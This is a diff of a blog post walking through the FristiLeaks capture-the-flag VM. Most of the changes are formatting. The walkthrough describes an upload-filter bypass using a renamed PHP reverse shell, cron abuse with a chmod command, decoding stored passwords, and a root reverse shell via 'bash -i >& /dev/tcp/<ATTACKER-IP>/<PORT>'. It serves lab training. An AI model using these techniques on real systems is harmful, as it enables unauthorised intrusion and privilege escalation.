@@ -4,7 +4,7 @@
 Meant to be broken in a few hours without requiring debuggers, reverse engineering, etc..&lt;/p&gt;
 &lt;h2&gt;Setup&lt;/h2&gt;
 &lt;p&gt;The virtual machine requires DHCP, and you have to manually set the machine's MAC address to &lt;strong&gt;08:00:27:A5:A6:76&lt;/strong&gt;.
-My setup runs on an isolated network &lt;code&gt;10.100.100.0/24&lt;/code&gt;, and the attacking box is at &lt;code&gt;10.100.100.99/24&lt;/code&gt;.
+My setup runs on an isolated network &lt;strong&gt;10.100.100.0/24&lt;/strong&gt;, and the attacking box is at &lt;strong&gt;10.100.100.99/24&lt;/strong&gt;.
 You can find the box &lt;a href="https://www.vulnhub.com/entry/fristileaks-13,133/"&gt;here&lt;/a&gt; to follow along or do yourself.&lt;/p&gt;
 &lt;h1&gt;Reconnaissance&lt;/h1&gt;
 &lt;p&gt;First we should verify that the box is online. After, we can determine what services are running on the target.&lt;/p&gt;
@@ -31,12 +31,12 @@ MAC Address: 08:00:27:A5:A6:76 (Oracle VirtualBox virtual NIC)
 Further scans did not reveal any other external services.&lt;/p&gt;
 &lt;p&gt;Using a browser to navigate to the site reveals a colourful webpage, but nowhere obvious to go:&lt;/p&gt;
 &lt;p&gt;&lt;img alt="Fristileaks homepage" src="/images/ctf/fristileaks/homepage.png" title="Fristileaks homepage"&gt;&lt;/p&gt;
-&lt;p&gt;There is very little content on this page, however nmap found a &lt;code&gt;http-robots.txt&lt;/code&gt; file that had some directories listed.
+&lt;p&gt;There is very little content on this page, however nmap found a &lt;strong&gt;http-robots.txt&lt;/strong&gt; file that had some directories listed.
 Viewing any of them reveals a sneaky trick, and another dead end.&lt;/p&gt;
 &lt;p&gt;&lt;img alt="Not the URL we are looking for" src="/images/ctf/fristileaks/droid.png" title="Not the URL we are looking for"&gt;&lt;/p&gt;
-&lt;p&gt;Navigating to &lt;code&gt;/admin&lt;/code&gt; only leads to a 404 Not Found message, so we will have to input other possible directory or URI names.
+&lt;p&gt;Navigating to &lt;strong&gt;/admin&lt;/strong&gt; only leads to a 404 Not Found message, so we will have to input other possible directory or URI names.
 Fortunately, we don't have to brute force this puzzle.
-By simply going to &lt;code&gt;/fristi&lt;/code&gt;, one will be rewarded with a hidden admin portal asking for credentials.&lt;/p&gt;
+By simply going to &lt;strong&gt;/fristi&lt;/strong&gt;, one will be rewarded with a hidden admin portal asking for credentials.&lt;/p&gt;
 &lt;p&gt;&lt;img alt="Fristileaks hidden admin page" src="/images/ctf/fristileaks/adminpage.png" title="Fristileaks hidden admin page"&gt;&lt;/p&gt;
 &lt;h1&gt;Exploitatin &amp;amp;&amp;amp; Gaining Access&lt;/h1&gt;
 &lt;p&gt;Attempting to bypass the authentication using typical methods (such as SQLi or default creds) doesn't seem to work.
@@ -45,13 +45,13 @@ While taking a look at the page source, we find a few interesting comments.&lt;/
 &lt;p&gt;&lt;img alt="Comment from eezeepz" src="/images/ctf/fristileaks/admin-comment.png" title="Comment from eezeepz"&gt;&lt;/p&gt;
 &lt;p&gt;and the other is Base64 encoded.&lt;/p&gt;
 &lt;p&gt;&lt;img alt="Base64 encoded something" src="/images/ctf/fristileaks/admin-base64.png" title="Base64 encoded something"&gt;&lt;/p&gt;
-&lt;p&gt;Decoding the B64 text reveals a PNG image with the text &lt;code&gt;keKkeKKeKKeKkEkkEk&lt;/code&gt;.
-Using &lt;code&gt;eezeepz:keKkeKKeKKeKkEkkEk&lt;/code&gt; for credentials does work, and redirects us to &lt;code&gt;/fristi/login_success.php&lt;/code&gt;, with a link to &lt;code&gt;/fristi/upload.php&lt;/code&gt;.
+&lt;p&gt;Decoding the B64 text reveals a PNG image with the text &lt;strong&gt;keKkeKKeKKeKkEkkEk&lt;/strong&gt;.
+Using &lt;strong&gt;eezeepz:keKkeKKeKKeKkEkkEk&lt;/strong&gt; for credentials does work, and redirects us to &lt;strong&gt;/fristi/login_success.php&lt;/strong&gt;, with a link to &lt;strong&gt;/fristi/upload.php&lt;/strong&gt;.
 Progress!&lt;/p&gt;
 &lt;p&gt;There are some minor restrictions.
 The file uploaded must be a PNG, JPG, or GIF image.
 Fortunately this is a very simple filter, and easily bypassed.&lt;/p&gt;
-&lt;p&gt;Simply: locate your PHP webshell of choice (such as &lt;code&gt;php-reverse-shell.php&lt;/code&gt;, located in &lt;code&gt;/usr/share/webshells/php&lt;/code&gt; in Kali); copy it to your working directory and modify as needed; rename the file with .png appended (&lt;code&gt;php-reverse-shell.php.png&lt;/code&gt;); upload the shell, and navigate to &lt;code&gt;/fristi/uploads/&amp;lt;your-file-name-here&amp;gt;.php.png&lt;/code&gt;.&lt;/p&gt;
+&lt;p&gt;Simply: locate your PHP webshell of choice (such as &lt;strong&gt;php-reverse-shell.php&lt;/strong&gt;, located in &lt;strong&gt;/usr/share/webshells/php&lt;/strong&gt; in Kali); copy it to your working directory and modify as needed; rename the file with .png appended (&lt;strong&gt;php-reverse-shell.php.png&lt;/strong&gt;); upload the shell, and navigate to &lt;strong&gt;/fristi/uploads/&lt;your-file-name-here&gt;.php.png&lt;/strong&gt;.&lt;/p&gt;
 &lt;p&gt;&lt;img alt="Uploading webshell" src="/images/ctf/fristileaks/upload.png" title="Uploading webshell"&gt;&lt;/p&gt;
 &lt;p&gt;And just like magic, we now have a shell as the &lt;strong&gt;apache&lt;/strong&gt; user account!&lt;/p&gt;
 &lt;p&gt;&lt;img alt="Webshell!" src="/images/ctf/fristileaks/webshell.png" title="Webshell!"&gt;&lt;/p&gt;
@@ -59,36 +59,36 @@ Fortunately this is a very simple filter, and easily bypassed.&lt;/p&gt;
 &lt;p&gt;The apache user has very limited privileges, so we should make it our goal to quickly gain access to another user account.&lt;/p&gt;
 &lt;p&gt;There are three user accounts we could compromise:&lt;/p&gt;
 &lt;p&gt;&lt;img alt="User accounts" src="/images/ctf/fristileaks/home.png" title="/home"&gt;&lt;/p&gt;
-&lt;p&gt;Since we don't have access to any directory but &lt;code&gt;/home/eezeepz&lt;/code&gt;, we will have to start there.&lt;/p&gt;
-&lt;p&gt;Navigating to &lt;strong&gt;eezeepz&lt;/strong&gt;'s home directory, there is a slough of system binaries and a &lt;code&gt;notes.txt&lt;/code&gt; file:&lt;/p&gt;
+&lt;p&gt;Since we don't have access to any directory but &lt;strong&gt;/home/eezeepz&lt;/strong&gt;, we will have to start there.&lt;/p&gt;
+&lt;p&gt;Navigating to &lt;strong&gt;eezeepz&lt;/strong&gt;'s home directory, there is a slough of system binaries and a &lt;strong&gt;notes.txt&lt;/strong&gt; file:&lt;/p&gt;
 &lt;p&gt;&lt;img alt="Content of notes.txt" src="/images/ctf/fristileaks/notes.png" title="Content of notes.txt"&gt;&lt;/p&gt;
 &lt;p&gt;The instructions are pretty straightforward.
-By listing binaries using full paths in &lt;code&gt;/usr/bin&lt;/code&gt;, &lt;code&gt;/home/admin&lt;/code&gt;, and presumably &lt;code&gt;/home/eezeepz&lt;/code&gt; in a file called &lt;code&gt;/tmp/runthis&lt;/code&gt;, a cronjob will execute the binaries every minute as &lt;strong&gt;admin&lt;/strong&gt;.&lt;/p&gt;
-&lt;p&gt;My solution to this was to execute &lt;code&gt;echo "/home/admin/chmod 707 /home/admin" &amp;gt;&amp;gt; /tmp/runthis&lt;/code&gt;, which will give us read, write, and execute privileges in &lt;code&gt;/home/admin&lt;/code&gt; as any user.&lt;/p&gt;
+By listing binaries using full paths in &lt;strong&gt;/usr/bin&lt;/strong&gt;, &lt;strong&gt;/home/admin&lt;/strong&gt;, and presumably &lt;strong&gt;/home/eezeepz&lt;/strong&gt; in a file called &lt;strong&gt;/tmp/runthis&lt;/strong&gt;, a cronjob will execute the binaries every minute as user &lt;strong&gt;admin&lt;/strong&gt;.&lt;/p&gt;
+&lt;p&gt;My solution to this was to execute &lt;strong&gt;&lt;code&gt;echo "/home/admin/chmod 707 /home/admin" &amp;gt;&amp;gt; /tmp/runthis&lt;/code&gt;&lt;/strong&gt;, which will give us read, write, and execute privileges in &lt;strong&gt;/home/admin&lt;/strong&gt; from any account.&lt;/p&gt;
 &lt;p&gt;&lt;img alt="Modifying /home/admin privileges" src="/images/ctf/fristileaks/chmod.png" title="Modifying /home/admin privileges"&gt;&lt;/p&gt;
 &lt;h1&gt;Privilege Escalation&lt;/h1&gt;
-&lt;p&gt;Taking a look into the newly accessible directory reveals the previously noted system binaries, some python scripts, and two text files &lt;code&gt;cryptedpass.txt&lt;/code&gt; (owned by admin) and &lt;code&gt;whoisyourgodnow.txt&lt;/code&gt; (owned by fristigod).&lt;/p&gt;
-&lt;p&gt;The contents of the text files appear to be the output of the &lt;code&gt;cryptpass.py&lt;/code&gt; script.&lt;/p&gt;
+&lt;p&gt;Taking a look into the newly accessible directory reveals the previously noted system binaries, some python scripts, and two text files: &lt;strong&gt;cryptedpass.txt&lt;/strong&gt; (owned by admin) and &lt;strong&gt;whoisyourgodnow.txt&lt;/strong&gt; (owned by fristigod).&lt;/p&gt;
+&lt;p&gt;The contents of the text files appear to be the output of the &lt;strong&gt;cryptpass.py&lt;/strong&gt; script.&lt;/p&gt;
 &lt;p&gt;&lt;img alt="cryptedpass.txt/cryptpass.py" src="/images/ctf/fristileaks/cryptpass.png" title="The contents of cryptedpass.txt and cryptpass.py"&gt;&lt;/p&gt;
 &lt;p&gt;The python script takes a string argument, encodes it in Base64, and then reverses the string and modifies it with ROT13.
 This isn't encryption; it's encoding, and passwords should never be encrypted or encoded.&lt;/p&gt;
-&lt;p&gt;The process is easy to reverse,  especially using &lt;a href="https://github.com/gchq/CyberChef"&gt;CyberChef&lt;/a&gt;.&lt;/p&gt;
+&lt;p&gt;The process is easy to reverse, especially using &lt;a href="https://github.com/gchq/CyberChef"&gt;CyberChef&lt;/a&gt;.&lt;/p&gt;
 &lt;p&gt;&lt;img alt="Reversing cryptedpass.txt" src="/images/ctf/fristileaks/rev-cryptedpass.png" title="Reversing cryptedpass.txt"&gt;
 &lt;img alt="Reversing whoisyourgodnow.txt" src="/images/ctf/fristileaks/rev-whoisyourgodnow.png" title="Reversing whoisyourgodnow.txt"&gt;&lt;/p&gt;
 &lt;p&gt;At this point I uploaded a PHP reverse shell and caught it with Ncat, as the webshell I used isn't a terminal and thus cannot use &lt;code&gt;su&lt;/code&gt; or &lt;code&gt;sudo&lt;/code&gt;.&lt;/p&gt;
 &lt;p&gt;&lt;img alt="su admin" src="/images/ctf/fristileaks/su-admin.png" title="su admin"&gt;
 &lt;img alt="su fristigod" src="/images/ctf/fristileaks/su-fristigod.png" title="su fristigod"&gt;&lt;/p&gt;
 &lt;h1&gt;Getting Root&lt;/h1&gt;
-&lt;p&gt;Despite being called &lt;strong&gt;admin&lt;/strong&gt;, I determined that the account did not have sufficient rights to use sudo.
-&lt;strong&gt;Fristigod&lt;/strong&gt;, on the other hand, has access to a single binary.&lt;/p&gt;
+&lt;p&gt;Despite being called admin, I determined that the account did not have sufficient rights to use sudo.
+However, &lt;strong&gt;fristigod&lt;/strong&gt; has access to a single binary.&lt;/p&gt;
 &lt;p&gt;&lt;img alt="One true binary" src="/images/ctf/fristileaks/fristigod-sudo-l.png" title="One true binary"&gt;&lt;/p&gt;
-&lt;p&gt;Fristigod may run sudo as user &lt;strong&gt;fristi&lt;/strong&gt; to execute &lt;code&gt;/var/fristigod/.secret_admin_stuff/doCom&lt;/code&gt;.
-So what is &lt;code&gt;doCom&lt;/code&gt;?
+&lt;p&gt;Fristigod may run sudo as user &lt;strong&gt;fristi&lt;/strong&gt; to execute &lt;strong&gt;/var/fristigod/.secret_admin_stuff/doCom&lt;/strong&gt;.
+So what is this doCom?
 In our case, it's a SUID binary owned by root that executes shell commands that are fed to it.&lt;/p&gt;
 &lt;p&gt;&lt;img alt="doCom" src="/images/ctf/fristileaks/doCom.png" title="doCom"&gt;&lt;/p&gt;
 &lt;p&gt;Let's verify that it runs as root.&lt;/p&gt;
 &lt;p&gt;&lt;img alt="Testing execution" src="/images/ctf/fristileaks/exec-test.png" title="Testing execution"&gt;&lt;/p&gt;
 &lt;p&gt;Excellent!&lt;/p&gt;
-&lt;p&gt;This means that we can execute a simple reverse shell as root. I like using &lt;code&gt;bash -i &amp;gt;&amp;amp; /dev/tcp/&amp;lt;ATTAKCER-IP&amp;gt;/&amp;lt;PORT&amp;gt; 0&amp;gt;&amp;amp;1&lt;/code&gt; from &lt;a href="http://pentestmonkey.net/"&gt;pentestmonkey&lt;/a&gt;.&lt;/p&gt;
+&lt;p&gt;This means that we can execute a simple reverse shell as root. I like using &lt;strong&gt;&lt;code&gt;bash -i &amp;gt;&amp;amp; /dev/tcp/&amp;lt;ATTACKER-IP&amp;gt;/&amp;lt;PORT&amp;gt; 0&amp;gt;&amp;amp;1&lt;/code&gt;&lt;/strong&gt; from &lt;a href="http://pentestmonkey.net/"&gt;pentestmonkey&lt;/a&gt;.&lt;/p&gt;
 &lt;p&gt;&lt;img alt="Getting root" src="/images/ctf/fristileaks/get-root.png" title="Getting root"&gt;&lt;/p&gt;
 &lt;p&gt;&lt;img alt="Got root" src="/images/ctf/fristileaks/got-root.png" title="Got root"&gt;&lt;/p&gt;</content><category term="ctf"></category><category term="vulnhub"></category></entry></feed>
